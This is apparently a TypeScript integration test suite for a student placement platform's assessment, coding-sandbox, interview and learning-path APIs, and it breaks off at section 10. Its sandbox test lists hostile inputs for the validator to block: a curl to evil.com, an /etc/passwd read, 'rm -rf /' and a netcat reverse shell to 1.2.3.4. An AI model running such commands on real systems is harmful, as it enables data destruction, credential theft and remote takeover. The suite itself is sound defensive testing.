/**
 * CarrerSync Phase 12 — Student Mock Drive, Assessment Engine & Personalized Learning Intelligence
 * End-to-End Integration & Regression Test Suite
 *
 * Test Suites:
 * 1. Authentication & Role-Based Access Control (RBAC: Student vs TPO vs Recruiter)
 * 2. Aptitude Assessment: Answer Leak Prevention, Timed Attempts, Score Calculation, Negative Marking, Topic Breakdown
 * 3. Technical Coding: Problem Catalog, Language Support, Test Execution, Sandboxed Security, Hidden Test Masking
 * 4. Interview Practice: 12 Target Roles, 9 Categories, 5-Dimension Evaluation, Deterministic Fallback, Zero Surveillance
 * 5. Mock Drive Orchestration: Multi-round Progression (Aptitude -> Coding -> Interview) & Participation Tracking
 * 6. Personal Performance Report: Composite Score Calculation, Score Evidence Verification, No Invented Data
 * 7. Weakness Identification: 4-Tier Categorization (ASSESSED_STRENGTH, IMPROVEMENT_NEEDED, NOT_ASSESSED, INSUFFICIENT_DATA)
 * 8. Personalized Learning Path: Weakness-to-Roadmap Synthesis & Task Lifecycle State Machine
 * 9. Project-Based Evidence Integration: Repository Links & Strict Governance (No Auto-Verified Status)
 * 10. TPO Mock Drive Administration: Drive Creation, Round Configuration, Question Banks & Cohort Analytics
 * 11. Anti-Tampering, Cross-Tenant Isolation & Object-Level Security Boundaries
 */

import { describe, it, expect, beforeAll } from 'vitest';
import request from 'supertest';
import app from '../src/app';
import { createJwtToken } from '../src/utils/crypto';
import { codingExecutionAdapter } from '../src/assessment/coding-execution.adapter';
import { interviewEvaluator } from '../src/assessment/interview-evaluator';
import { mockDriveService } from '../src/assessment/mock-drive.service';
import { learningPathService } from '../src/assessment/learning-path.service';

describe('Phase 12 — End-to-End Mock Drive, Assessment Engine & Learning Intelligence', () => {
  const TENANT_A = '11111111-1111-4111-8111-111111111111';
  const TENANT_B = '22222222-2222-4222-8222-222222222222';

  // Users for Tenant A
  const studentA1 = {
    id: 's0000001-1111-4111-8111-111111111111',
    email: 'aarav.sharma@campus-a.edu',
    role: 'student',
    tenantId: TENANT_A
  };

  const studentA2 = {
    id: 's0000002-1111-4111-8111-111111111111',
    email: 'diya.patel@campus-a.edu',
    role: 'student',
    tenantId: TENANT_A
  };

  const tpoAdminA = {
    id: 't0000001-1111-4111-8111-111111111111',
    email: 'tpo.director@campus-a.edu',
    role: 'tpo_admin',
    tenantId: TENANT_A
  };

  const recruiterUserA = {
    id: 'r0000001-1111-4111-8111-111111111111',
    email: 'talent@techcorp.com',
    role: 'recruiter',
    tenantId: TENANT_A
  };

  // Users for Tenant B (for multi-tenant isolation testing)
  const studentB = {
    id: 's0000001-2222-4222-8222-222222222222',
    email: 'rohan.verma@campus-b.edu',
    role: 'student',
    tenantId: TENANT_B
  };

  const tpoAdminB = {
    id: 't0000001-2222-4222-8222-222222222222',
    email: 'tpo.lead@campus-b.edu',
    role: 'tpo_admin',
    tenantId: TENANT_B
  };

  let tokenStudentA1: string;
  let tokenStudentA2: string;
  let tokenTpoA: string;
  let tokenRecruiterA: string;
  let tokenStudentB: string;
  let tokenTpoB: string;

  beforeAll(async () => {
    tokenStudentA1 = await createJwtToken({
      sub: studentA1.id,
      tenant_id: studentA1.tenantId,
      role: studentA1.role,
      email: studentA1.email
    });

    tokenStudentA2 = await createJwtToken({
      sub: studentA2.id,
      tenant_id: studentA2.tenantId,
      role: studentA2.role,
      email: studentA2.email
    });

    tokenTpoA = await createJwtToken({
      sub: tpoAdminA.id,
      tenant_id: tpoAdminA.tenantId,
      role: tpoAdminA.role,
      email: tpoAdminA.email
    });

    tokenRecruiterA = await createJwtToken({
      sub: recruiterUserA.id,
      tenant_id: recruiterUserA.tenantId,
      role: recruiterUserA.role,
      email: recruiterUserA.email
    });

    tokenStudentB = await createJwtToken({
      sub: studentB.id,
      tenant_id: studentB.tenantId,
      role: studentB.role,
      email: studentB.email
    });

    tokenTpoB = await createJwtToken({
      sub: tpoAdminB.id,
      tenant_id: tpoAdminB.tenantId,
      role: tpoAdminB.role,
      email: tpoAdminB.email
    });
  });

  // =========================================================================
  // 1. Authentication & Role-Based Access Control (RBAC)
  // =========================================================================
  describe('1. Authentication & Role-Based Access Control (RBAC)', () => {
    it('should reject requests without authorization token with 401 Unauthorized', async () => {
      const res1 = await request(app).get('/api/v1/student/assessments/aptitude/questions');
      expect(res1.status).toBe(401);
      expect(res1.body.success).toBe(false);

      const res2 = await request(app).get('/api/v1/student/learning-path');
      expect(res2.status).toBe(401);

      const res3 = await request(app).get('/api/v1/tpo/mock-drives');
      expect(res3.status).toBe(401);
    });

    it('should reject requests with invalid or malformed tokens with 401 Unauthorized', async () => {
      const res = await request(app)
        .get('/api/v1/student/assessments/aptitude/questions')
        .set('Authorization', 'Bearer invalid-token-string');
      expect(res.status).toBe(401);
      expect(res.body.success).toBe(false);
    });

    it('should block Recruiter from accessing student assessment endpoints with 403 Forbidden', async () => {
      const res = await request(app)
        .get('/api/v1/student/assessments/aptitude/questions')
        .set('Authorization', `Bearer ${tokenRecruiterA}`);
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('Forbidden');
      expect(res.body.code).toBe('FORBIDDEN_ROLE');
    });

    it('should block Recruiter from accessing student personalized learning pathways with 403 Forbidden', async () => {
      const res = await request(app)
        .get('/api/v1/student/learning-path')
        .set('Authorization', `Bearer ${tokenRecruiterA}`);
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('Forbidden');
    });

    it('should block Student from accessing TPO mock drive management with 403 Forbidden', async () => {
      const res = await request(app)
        .get('/api/v1/tpo/mock-drives')
        .set('Authorization', `Bearer ${tokenStudentA1}`);
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('Forbidden');
      expect(res.body.code).toBe('FORBIDDEN_INSUFFICIENT_ROLE');
    });

    it('should block Recruiter from accessing TPO mock drive administration with 403 Forbidden', async () => {
      const res = await request(app)
        .get('/api/v1/tpo/mock-drives')
        .set('Authorization', `Bearer ${tokenRecruiterA}`);
      expect(res.status).toBe(403);
      expect(res.body.code).toBe('FORBIDDEN_INSUFFICIENT_ROLE');
    });

    it('should allow legitimate Student to access student assessment endpoints', async () => {
      const res = await request(app)
        .get('/api/v1/student/assessments/aptitude/questions')
        .set('Authorization', `Bearer ${tokenStudentA1}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
    });

    it('should allow legitimate TPO Admin to access TPO mock drive administration endpoints', async () => {
      const res = await request(app)
        .get('/api/v1/tpo/mock-drives')
        .set('Authorization', `Bearer ${tokenTpoA}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
    });
  });

  // =========================================================================
  // 2. Aptitude Assessment: Answer Leak Prevention, Scoring & Breakdown
  // =========================================================================
  describe('2. Aptitude Assessment Engine & Answer Protection', () => {
    it('should retrieve aptitude questions WITHOUT leaking correctOptionId or explanation', async () => {
      const res = await request(app)
        .get('/api/v1/student/assessments/aptitude/questions?limit=10')
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.questions.length).toBeGreaterThan(0);

      // Verify strict answer leak prevention across all returned questions
      for (const question of res.body.questions) {
        expect(question.id).toBeDefined();
        expect(question.topic).toBeDefined();
        expect(question.question).toBeDefined();
        expect(Array.isArray(question.options)).toBe(true);
        expect(question.options.length).toBeGreaterThanOrEqual(2);

        // Security check: correctOptionId and explanation MUST NOT be present
        expect((question as any).correctOptionId).toBeUndefined();
        expect((question as any).explanation).toBeUndefined();
      }
    });

    it('should initiate a timed aptitude attempt with countdown constraints', async () => {
      const res = await request(app)
        .post('/api/v1/student/assessments/aptitude/start')
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({
          durationMinutes: 20,
          questionCount: 4
        });

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      const attempt = res.body.attempt;
      expect(attempt.id).toBeDefined();
      expect(attempt.studentId).toBe(studentA1.id);
      expect(attempt.status).toBe('IN_PROGRESS');
      expect(attempt.startedAt).toBeDefined();
      expect(attempt.expiresAt).toBeDefined();

      const startTime = new Date(attempt.startedAt).getTime();
      const expireTime = new Date(attempt.expiresAt).getTime();
      const diffMinutes = Math.round((expireTime - startTime) / (60 * 1000));
      expect(diffMinutes).toBe(20); // exactly 20 minutes
      expect(attempt.questions).toHaveLength(4);

      // Ensure questions inside attempt also never leak answers
      for (const q of attempt.questions) {
        expect((q as any).correctOptionId).toBeUndefined();
        expect((q as any).explanation).toBeUndefined();
      }
    });

    it('should save intermediate answers during the test without finalizing it', async () => {
      const startRes = await request(app)
        .post('/api/v1/student/assessments/aptitude/start')
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ durationMinutes: 15, questionCount: 3 });

      const attemptId = startRes.body.attempt.id;
      const q1Id = startRes.body.attempt.questions[0].id;
      const optId = startRes.body.attempt.questions[0].options[0].id;

      const saveRes = await request(app)
        .post(`/api/v1/student/assessments/aptitude/${attemptId}/save`)
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({
          answers: {
            [q1Id]: optId
          }
        });

      expect(saveRes.status).toBe(200);
      expect(saveRes.body.success).toBe(true);
      expect(saveRes.body.status).toBe('IN_PROGRESS');
    });

    it('should accurately calculate score server-side with negative marking and topic breakdown', async () => {
      const startRes = await request(app)
        .post('/api/v1/student/assessments/aptitude/start')
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ durationMinutes: 30, questionCount: 3 });

      const attemptId = startRes.body.attempt.id;
      const questions = startRes.body.attempt.questions;

      // Access underlying service directly to verify expected answers
      const q1 = (mockDriveService as any).mcqQuestions.get(questions[0].id);
      const q2 = (mockDriveService as any).mcqQuestions.get(questions[1].id);
      const q3 = (mockDriveService as any).mcqQuestions.get(questions[2].id);

      const wrongOptForQ2 = q2.options.find((o: any) => o.id !== q2.correctOptionId).id;

      // Submitting: Q1 correct (+2), Q2 incorrect (-0.5), Q3 unattempted (0)
      const submitRes = await request(app)
        .post(`/api/v1/student/assessments/aptitude/${attemptId}/submit`)
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({
          answers: {
            [q1.id]: q1.correctOptionId,
            [q2.id]: wrongOptForQ2
            // Q3 omitted (unanswered)
          }
        });

      expect(submitRes.status).toBe(200);
      expect(submitRes.body.success).toBe(true);
      expect(submitRes.body.score).toBe(1.5); // 2 - 0.5 = 1.5
      expect(submitRes.body.maxScore).toBe(6);
      expect(submitRes.body.percentage).toBe(25); // 1.5 / 6 * 100 = 25%

      // Verify detailed topic breakdown
      const breakdown = submitRes.body.topicBreakdown;
      expect(breakdown).toBeDefined();
      expect(Object.keys(breakdown).length).toBeGreaterThan(0);

      // Verify review details contain explanation ONLY AFTER submission
      expect(submitRes.body.reviewDetails).toHaveLength(3);
      const reviewedQ1 = submitRes.body.reviewDetails.find((r: any) => r.questionId === q1.id);
      expect(reviewedQ1.isCorrect).toBe(true);
      expect(reviewedQ1.marksAwarded).toBe(2);
      expect(reviewedQ1.correctOptionId).toBe(q1.correctOptionId);
      expect(reviewedQ1.explanation).toBeDefined();

      const reviewedQ2 = submitRes.body.reviewDetails.find((r: any) => r.questionId === q2.id);
      expect(reviewedQ2.isCorrect).toBe(false);
      expect(reviewedQ2.marksAwarded).toBe(-0.5);

      const reviewedQ3 = submitRes.body.reviewDetails.find((r: any) => r.questionId === q3.id);
      expect(reviewedQ3.isCorrect).toBe(false);
      expect(reviewedQ3.marksAwarded).toBe(0);
    });

    it('should reject submitting an invalid or non-existent attempt', async () => {
      const invalidRes = await request(app)
        .post('/api/v1/student/assessments/aptitude/non-existent-attempt-id/submit')
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ answers: {} });

      expect(invalidRes.status).toBe(400);
      expect(invalidRes.body.success).toBe(false);
      expect(invalidRes.body.error).toContain('not found');
    });
  });

  // =========================================================================
  // 3. Technical Coding: Problem Catalog, Sandboxing & Execution
  // =========================================================================
  describe('3. Technical Coding Challenge & Safe Execution Adapter', () => {
    it('should retrieve problem catalog and omit hidden test cases from client', async () => {
      const res = await request(app)
        .get('/api/v1/student/assessments/coding/problems')
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.problems.length).toBeGreaterThan(0);

      for (const problem of res.body.problems) {
        expect(problem.id).toBeDefined();
        expect(problem.title).toBeDefined();
        expect(problem.initialCodeTemplates).toBeDefined();
        expect(problem.visibleTestCases).toBeDefined();

        // Hidden test cases MUST NOT be returned in client listing
        expect((problem as any).testCases).toBeUndefined();
      }
    });

    it('should block malicious RCE and dangerous system calls in all supported languages', () => {
      const maliciousCases = [
        { lang: 'javascript', code: 'require("child_process").exec("curl http://evil.com")' },
        { lang: 'javascript', code: 'process.exit(0)' },
        { lang: 'javascript', code: 'const fs = require("fs"); fs.readFileSync("/etc/passwd")' },
        { lang: 'javascript', code: 'eval("while(1){}")' },
        { lang: 'python', code: 'import os\nos.system("rm -rf /")' },
        { lang: 'python', code: 'import subprocess\nsubprocess.run(["ls"])' },
        { lang: 'python', code: 'exec("import sys; sys.exit()")' },
        { lang: 'java', code: 'Runtime.getRuntime().exec("nc -e /bin/sh 1.2.3.4 4444");' },
        { lang: 'java', code: 'Class.forName("java.lang.ProcessBuilder").newInstance();' },
        { lang: 'cpp', code: '#include <sys/socket.h>\nint main() { return 0; }' },
        { lang: 'cpp', code: 'int main() { system("whoami"); return 0; }' }
      ];

      for (const tc of maliciousCases) {
        const validation = codingExecutionAdapter.validateCode(tc.code, tc.lang as any);
        expect(validation.isValid).toBe(false);
        expect(validation.verdict).toBe('SECURITY_VIOLATION');
        expect(validation.error).toContain('Security violation detected');
      }
    });

    it('should catch unbalanced braces and syntactic errors before execution', () => {
      const brokenPyBrackets = 'def solve(): return [1, 2, (3 + 4]';
      const valPy = codingExecutionAdapter.validateCode(brokenPyBrackets, 'python');
      expect(valPy.isValid).toBe(false);
      expect(valPy.verdict).toBe('SYNTAX_ERROR');

      const brokenJs = 'function solve() { return (1 + 2; }';
      const valJs = codingExecutionAdapter.validateCode(brokenJs, 'javascript');
      expect(valJs.isValid).toBe(false);
      expect(valJs.verdict).toBe('SYNTAX_ERROR');
    });

    it('should enforce execution timeout protection on infinite loops without crashing worker', async () => {
      const infiniteLoopJs = `
        function twoSum(nums, target) {
          while (true) {
            // infinite hang
          }
        }
      `;

      const result = await codingExecutionAdapter.evaluateCode({
        problemId: 'code-prob-01',
        code: infiniteLoopJs,
        language: 'javascript',
        testCases: [{ id: 'tc-1', input: '[2,7,11,15], 9', expectedOutput: '[0,1]', isHidden: false }],
        maxScore: 100,
        timeoutMs: 150
      });

      expect(result.verdict).toBe('TIME_LIMIT_EXCEEDED');
      expect(result.passedCount).toBe(0);
      expect(result.results[0].passed).toBe(false);
      expect(result.results[0].errorMessage).toContain('timeout');
    });

    it('POST /api/v1/student/assessments/coding/problems/:problemId/run tests against visible cases only', async () => {
      const validCode = `
        function twoSum(nums, target) {
          const map = new Map();
          for (let i = 0; i < nums.length; i++) {
            const comp = target - nums[i];
            if (map.has(comp)) return [map.get(comp), i];
            map.set(nums[i], i);
          }
          return [];
        }
      `;

      const res = await request(app)
        .post('/api/v1/student/assessments/coding/problems/code-prob-01/run')
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({
          code: validCode,
          language: 'javascript'
        });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.result.verdict).toBe('ACCEPTED');
      expect(res.body.result.passedCount).toBe(res.body.result.totalCount);
      // Ensure all test results in dry-run are visible
      for (const tc of res.body.result.results) {
        expect(tc.isHidden).toBe(false);
      }
    });

    it('POST /api/v1/student/assessments/coding/problems/:problemId/submit evaluates hidden cases and masks details', async () => {
      const validCode = `
        function twoSum(nums, target) {
          const map = new Map();
          for (let i = 0; i < nums.length; i++) {
            const comp = target - nums[i];
            if (map.has(comp)) return [map.get(comp), i];
            map.set(nums[i], i);
          }
          return [];
        }
      `;

      const res = await request(app)
        .post('/api/v1/student/assessments/coding/problems/code-prob-01/submit')
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({
          code: validCode,
          language: 'javascript'
        });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.result.verdict).toBe('ACCEPTED');
      expect(res.body.result.score).toBe(100);

      // Verify that hidden test cases in submission results mask expected output and input
      for (const tc of res.body.result.results) {
        if (tc.isHidden) {
          expect(tc.expectedOutput).toBeUndefined();
          expect(tc.input).toBe('[HIDDEN INPUT]');
        }
      }
    });
  });

  // =========================================================================
  // 4. Interview Practice: Roles, 5-Dimension Scoring & Non-Surveillance
  // =========================================================================
  describe('4. Interview Practice Engine & Ethical Non-Surveillance', () => {
    it('should list all 12 target roles and 9 standard technical categories', async () => {
      const res = await request(app)
        .get('/api/v1/student/interviews/practice/roles')
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.roles).toHaveLength(12);
      expect(res.body.roles).toContain('Software Engineer');
      expect(res.body.roles).toContain('Full Stack Developer');
      expect(res.body.roles).toContain('DevOps Engineer');
      expect(res.body.roles).toContain('Cybersecurity Analyst');

      expect(res.body.categories).toHaveLength(9);
      expect(res.body.categories).toContain('Data Structures and Algorithms');
      expect(res.body.categories).toContain('Operating Systems');
      expect(res.body.categories).toContain('HR and Communication');
    });

    it('should initialize an interview practice session without biometric or camera demands', async () => {
      const res = await request(app)
        .post('/api/v1/student/interviews/practice/start')
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({
          targetRole: 'Backend Developer',
          questionCount: 3
        });

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      const session = res.body.session;
      expect(session.id).toBeDefined();
      expect(session.targetRole).toBe('Backend Developer');
      expect(session.questions).toHaveLength(3);
      expect(session.status).toBe('IN_PROGRESS');

      // Zero-surveillance verification: assert NO facial tracking, eye gaze, camera request fields
      expect((session as any).cameraRequired).toBeUndefined();
      expect((session as any).facialRecognitionEnabled).toBeUndefined();
      expect((session as any).proctoringSessionId).toBeUndefined();
    });

    it('should evaluate answers across 5 structured dimensions with deterministic fallback', async () => {
      const startRes = await request(app)
        .post('/api/v1/student/interviews/practice/start')
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ targetRole: 'Software Engineer', questionCount: 2 });

      const sessionId = startRes.body.session.id;
      const question = startRes.body.session.questions[0];

      const richAnswer = `
        Arrays allocate contiguous blocks of memory providing O(1) constant time random access by index.
        However, inserting an element at the beginning requires shifting all subsequent elements, taking O(n) time.
        In contrast, a Linked List allocates nodes non-contiguously in heap memory with pointers, allowing O(1) insertion at head.
        Searching in a Linked List requires sequential pointer traversal taking O(n) linear time, and each node has extra pointer memory overhead.
      `;

      const answerRes = await request(app)
        .post(`/api/v1/student/interviews/practice/${sessionId}/answer`)
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({
          questionId: question.id,
          answerText: richAnswer
        });

      expect(answerRes.status).toBe(200);
      expect(answerRes.body.success).toBe(true);
      const evalData = answerRes.body.evaluation;
      expect(evalData.dimensions).toBeDefined();

      // Verify the 5 required dimensions
      expect(evalData.dimensions.correctness).toBeGreaterThanOrEqual(70);
      expect(evalData.dimensions.conceptUnderstanding).toBeGreaterThanOrEqual(70);
      expect(evalData.dimensions.completeness).toBeGreaterThanOrEqual(70);
      expect(evalData.dimensions.relevance).toBeGreaterThanOrEqual(70);
      expect(evalData.dimensions.clarity).toBeGreaterThanOrEqual(70);
      expect(evalData.dimensions.overallScore).toBeGreaterThanOrEqual(70);

      expect(evalData.strengths.length).toBeGreaterThan(0);
      expect(evalData.areasToImprove).toBeDefined();
      expect(evalData.suggestedAnswerModel).toBeDefined();
    });

    it('should complete interview session and generate aggregated report', async () => {
      const startRes = await request(app)
        .post('/api/v1/student/interviews/practice/start')
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ targetRole: 'Software Engineer', questionCount: 2 });

      const sessionId = startRes.body.session.id;
      const q1 = startRes.body.session.questions[0];

      await request(app)
        .post(`/api/v1/student/interviews/practice/${sessionId}/answer`)
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({
          questionId: q1.id,
          answerText: 'Object oriented programming principles are encapsulation, inheritance, polymorphism, and abstraction.'
        });

      const submitRes = await request(app)
        .post(`/api/v1/student/interviews/practice/${sessionId}/submit`)
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      expect(submitRes.status).toBe(200);
      expect(submitRes.body.success).toBe(true);
      const report = submitRes.body.report;
      expect(report.sessionId).toBe(sessionId);
      expect(report.targetRole).toBe('Software Engineer');
      expect(report.dimensionAverages.overallScore).toBeGreaterThan(0);
      expect(report.dimensionAverages.correctness).toBeGreaterThan(0);
    });
  });

  // =========================================================================
  // 5. Multi-Round Mock Drive Orchestration
  // =========================================================================
  describe('5. Mock Drive Orchestration & Multi-Round Workflow', () => {
    it('should list available institutional mock drives and register student', async () => {
      const listRes = await request(app)
        .get('/api/v1/student/mock-drives')
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      expect(listRes.status).toBe(200);
      expect(listRes.body.success).toBe(true);
      expect(listRes.body.drives.length).toBeGreaterThan(0);

      const driveId = listRes.body.drives[0].id;

      // Student registers for mock drive
      const regRes = await request(app)
        .post(`/api/v1/student/mock-drives/${driveId}/register`)
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      expect(regRes.status).toBe(201);
      expect(regRes.body.success).toBe(true);
      expect(regRes.body.registration.studentId).toBe(studentA1.id);
      expect(regRes.body.registration.driveId).toBe(driveId);
      expect(regRes.body.registration.currentRound).toBe(1);
    });

    it('should verify multi-round sequence (Aptitude -> Coding -> Interview)', async () => {
      const drive = mockDriveService.getMockDrive('mock-drive-standard-01');
      expect(drive).toBeDefined();
      expect(drive?.rounds).toHaveLength(3);

      expect(drive?.rounds[0].roundNumber).toBe(1);
      expect(drive?.rounds[0].roundType).toBe('APTITUDE');

      expect(drive?.rounds[1].roundNumber).toBe(2);
      expect(drive?.rounds[1].roundType).toBe('CODING');

      expect(drive?.rounds[2].roundNumber).toBe(3);
      expect(drive?.rounds[2].roundType).toBe('INTERVIEW');
    });
  });

  // =========================================================================
  // 6. Personal Performance Report: Composite Scoring & Score Evidence
  // =========================================================================
  describe('6. Personal Performance Report & Score Verification', () => {
    it('should return explainable performance reports backed by verified round scores', async () => {
      const res = await request(app)
        .get('/api/v1/student/mock-drives/reports')
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.reports.length).toBeGreaterThan(0);

      const report = res.body.reports[0];
      expect(report.id).toBeDefined();
      expect(report.studentId).toBe(studentA1.id);
      expect(report.overallCompositeScore).toBeGreaterThanOrEqual(0);
      expect(report.overallCompositeScore).toBeLessThanOrEqual(100);

      // Verify each individual round score is accounted for
      expect(report.roundScores.aptitude).toBeDefined();
      expect(report.roundScores.coding).toBeDefined();
      expect(report.roundScores.interview).toBeDefined();

      // Verify composite score formula: 30% Aptitude + 40% Coding + 30% Interview
      const expectedComposite = Math.round(
        report.roundScores.aptitude.percentage * 0.3 +
        report.roundScores.coding.percentage * 0.4 +
        report.roundScores.interview.percentage * 0.3
      );
      expect(report.overallCompositeScore).toBe(expectedComposite);

      // Verify no invented scores: skill verdicts must contain evidence
      expect(report.skillVerdicts.length).toBeGreaterThan(0);
      for (const verdict of report.skillVerdicts) {
        expect(verdict.skillName).toBeDefined();
        expect(verdict.category).toBeDefined();
        expect(verdict.evidenceSummary).toBeDefined();
        expect(verdict.evidenceSummary.length).toBeGreaterThan(0);
      }
    });

    it('should retrieve individual performance report by reportId', async () => {
      const listRes = await request(app)
        .get('/api/v1/student/mock-drives/reports')
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      const reportId = listRes.body.reports[0].id;

      const detailRes = await request(app)
        .get(`/api/v1/student/mock-drives/reports/${reportId}`)
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      expect(detailRes.status).toBe(200);
      expect(detailRes.body.success).toBe(true);
      expect(detailRes.body.report.id).toBe(reportId);
    });
  });

  // =========================================================================
  // 7. Weakness Identification: 4-Tier Categorization
  // =========================================================================
  describe('7. Weakness Identification & Skill Gap Categorization', () => {
    it('should classify student competencies into 4 distinct categories without inventing gaps', async () => {
      const res = await request(app)
        .get('/api/v1/student/mock-drives/weaknesses?targetRole=Software%20Engineer')
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      const summary = res.body.weaknesses;
      expect(summary.studentId).toBe(studentA1.id);
      expect(summary.targetRole).toBe('Software Engineer');

      // Assert existence of the 4 defined categories
      expect(Array.isArray(summary.assessedStrengths)).toBe(true);
      expect(Array.isArray(summary.improvementNeeded)).toBe(true);
      expect(Array.isArray(summary.notAssessed)).toBe(true);
      expect(Array.isArray(summary.insufficientData)).toBe(true);

      // Verify that every assessed verdict matches allowed enum categories
      for (const v of [...summary.assessedStrengths, ...summary.improvementNeeded]) {
        expect([
          'ASSESSED_STRENGTH',
          'IMPROVEMENT_NEEDED',
          'NOT_ASSESSED',
          'INSUFFICIENT_DATA'
        ]).toContain(v.classification);
      }
      expect(Array.isArray(summary.notAssessed)).toBe(true);
      expect(Array.isArray(summary.insufficientData)).toBe(true);
    });
  });

  // =========================================================================
  // 8. Personalized Learning Path & Task Lifecycle State Machine
  // =========================================================================
  describe('8. Personalized Learning Path Service & Task Lifecycle', () => {
    it('should synthesize a tailored learning path from student assessment weaknesses', async () => {
      const res = await request(app)
        .post('/api/v1/student/learning-path/generate')
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ targetRole: 'Full Stack Developer' });

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      const path = res.body.learningPath;
      expect(path.studentId).toBe(studentA1.id);
      expect(path.targetRole).toBe('Full Stack Developer');
      expect(path.tasks.length).toBeGreaterThan(0);

      // Initial tasks should contain recommended and in-progress items
      expect(path.tasks.some((task: any) => task.status === 'RECOMMENDED')).toBe(true);
      for (const task of path.tasks) {
        expect(['RECOMMENDED', 'IN_PROGRESS']).toContain(task.status);
        expect(task.skillName).toBeDefined();
        expect(task.taskType).toBeDefined();
        expect(task.estimatedHours).toBeGreaterThan(0);
      }
    });

    it('should enforce state machine transitions: RECOMMENDED -> IN_PROGRESS -> PAUSED -> IN_PROGRESS', async () => {
      const getRes = await request(app)
        .get('/api/v1/student/learning-path')
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      const taskId = getRes.body.learningPath.tasks[0].id;

      // 1. Transition to IN_PROGRESS
      const step1 = await request(app)
        .patch(`/api/v1/student/learning-path/tasks/${taskId}/status`)
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ status: 'IN_PROGRESS' });

      expect(step1.status).toBe(200);
      expect(step1.body.task.status).toBe('IN_PROGRESS');

      // 2. Transition to PAUSED
      const step2 = await request(app)
        .patch(`/api/v1/student/learning-path/tasks/${taskId}/status`)
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ status: 'PAUSED' });

      expect(step2.status).toBe(200);
      expect(step2.body.task.status).toBe('PAUSED');

      // 3. Resume to IN_PROGRESS
      const step3 = await request(app)
        .patch(`/api/v1/student/learning-path/tasks/${taskId}/status`)
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ status: 'IN_PROGRESS' });

      expect(step3.status).toBe(200);
      expect(step3.body.task.status).toBe('IN_PROGRESS');
    });

    it('should reject invalid lifecycle transitions', async () => {
      const getRes = await request(app)
        .get('/api/v1/student/learning-path')
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      // Try transition from PAUSED directly to COMPLETED (without submission/review)
      const invalidTask = getRes.body.learningPath.tasks[1];

      const res = await request(app)
        .patch(`/api/v1/student/learning-path/tasks/${invalidTask.id}/status`)
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ status: 'COMPLETED' });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error).toContain('Invalid status transition');
    });
  });

  // =========================================================================
  // 9. Project-Based Evidence Integration & Governance Rules
  // =========================================================================
  describe('9. Project-Based Evidence Integration & Non-Auto-Verification Policy', () => {
    it('should accept repository / project evidence and keep status as PENDING_REVIEW (NEVER auto-VERIFIED)', async () => {
      const getRes = await request(app)
        .get('/api/v1/student/learning-path')
        .set('Authorization', `Bearer ${tokenStudentA1}`);

      const task = getRes.body.learningPath.tasks[0];

      // Ensure task is IN_PROGRESS first
      await request(app)
        .patch(`/api/v1/student/learning-path/tasks/${task.id}/status`)
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({ status: 'IN_PROGRESS' });

      // Submit repository evidence
      const submitRes = await request(app)
        .post(`/api/v1/student/learning-path/tasks/${task.id}/submit`)
        .set('Authorization', `Bearer ${tokenStudentA1}`)
        .send({
          submissionType: 'REPOSITORY',
          urlOrContent: 'https://github.com/aarav-sharma/microservices-event-bus',
          notes: 'Built event bus using RabbitMQ & Express with 92% unit test coverage.'
        });

      expect(submitRes.status).toBe(200);
      expect(submitRes.body.success).toBe(true);
      expect(submitRes.body.task.status).toBe('SUBMITTED_FOR_REVIEW');

      // CRITICAL PLATFORM POLICY CHECK:
      // Submitting code evidence MUST NOT auto-grant VERIFIED status.
      // Evidence status MUST be PENDING_REVIEW; verification power resides with authorized faculty/TPO!
      expect(submitRes.body.task.evidence).toBeDefined();
      expect(submitRes.body.task.evidence.status).toBe('PENDING_REVIEW');
      expect(submitRes.body.task.evidence.status).not.toBe('VERIFIED');
    });
  });

  // =========================================================================
  // 10. TPO Mock Drive Administration & Institutional Oversight
  // =========================================================================
  describe('10. TPO Mock Drive Administration & Institutional Oversight', () => {
